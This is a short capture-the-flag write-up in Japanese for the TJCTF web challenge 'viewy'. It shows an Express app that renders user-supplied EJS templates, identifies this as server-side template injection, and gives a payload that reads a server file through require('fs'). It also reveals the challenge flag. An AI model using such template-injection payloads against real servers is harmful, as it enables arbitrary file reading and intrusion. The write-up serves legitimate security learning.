# viewy:web:XXXXpts
views  
[Instancer](https://instancer.tjctf.org/viewy)  

Downloads  
[server.zip](server.zip)  

# Solution
インスタンス生成URLとソースが配布される。  
生成すると謎のレンダリングサイトであった。  
viewy  
[site.png](site/site.png)  
ソースを見ると以下のようであった。  
```js
~~~
app.post('/', (req, res) => {
  const id = uuidv4();
  const { content } = req.body;
  const fileName = path.join(__dirname, 'views/uploads', `${id}.ejs`);
  fs.writeFileSync(fileName, content);
  return res.redirect('/views/' + id);
});

app.get('/views/:id', (req, res) => {
  if (
    fs.existsSync(path.join(__dirname, 'views/uploads', `${req.params.id}.ejs`))
  ) {
    res.render('view', { id: req.params.id });
  } else {
    res.status(404).send('Not found');
  }
});
~~~
```
コンテンツを投稿できるようで、ejsを自由に記述できる。  
明らかなSSTIであるので以下のペイロードを送信し、flag.txtを読み取る(flag.txtの場所はソースファイルより一階層上であるとわかる)。  
```ejs
<%- global.process.mainModule.require('fs').readFileSync('../flag.txt').toString() %>
```
flag  
[flag.png](site/flag.png)  
flagが読み取れた。  

## tjctf{4l1_th3_v1eW5_wh3333e333}